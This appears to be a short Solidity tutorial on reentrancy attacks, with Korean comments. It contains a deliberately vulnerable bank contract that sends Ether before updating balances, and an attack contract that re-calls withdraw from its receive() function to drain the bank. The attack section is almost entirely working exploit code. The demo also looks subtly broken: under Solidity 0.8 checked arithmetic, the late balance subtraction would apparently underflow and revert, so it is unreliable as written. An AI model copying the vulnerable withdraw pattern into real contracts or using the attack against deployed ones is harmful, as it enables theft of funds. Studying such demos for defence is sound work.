# Reentrancy Attack
⚡️  ```Using the fallback function, which runs automatically when receiving Ether to take out money again and again without limit.```
* Vulnerable contract
* attack contract 





## Vulnerable contract
```solidity


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint) public balance;

    // 입금 함수
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    // 출금 함수 (취약점)
    function withdraw(uint _amount) public {
        // 1. Checks: 잔액 확인
        require(balance[msg.sender] >= _amount, "Insufficient balance");

        // 2.  이더를 먼저 보냄 (취약점!)
        //   -> 이 코드가 실행되면, msg.sender의 fallback 함수가 호출됨
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send Ether");

        // 3. Effects: 잔액 갱신 (너무 늦음!)
        //   -> 이 코드가 실행되기 전에 재진입 공격이 일어날 수 있음
        balance[msg.sender] -= _amount;
    }
    
    // 현재 컨트랙트의 잔액을 반환
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```


## attack contract 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public target;

    constructor(address _target) {
        target = VulnerableBank(_target);
    }
    
    // 공격 준비: TestBank에 1 이더를 입금
    function prepAttack() public payable {
        target.deposit{value: 1 ether}();
    }
    
    // 공격 시작: TestBank의 withdraw 함수 호출
    function attack() public {
        // 첫 번째 withdraw 호출
        // 이 함수를 호출한 주체가 바로 이 Attack 컨트랙트가 됨
        target.withdraw(1 ether);
    }

    // 이더를 받을 때마다 호출되는 fallback 함수
    // 이더를 받을 때마다 다시 withdraw를 호출하며 재진입 공격 시도
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether); // 재진입 공격
        }
    }
    
    // Attack 컨트랙트의 잔액을 반환
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

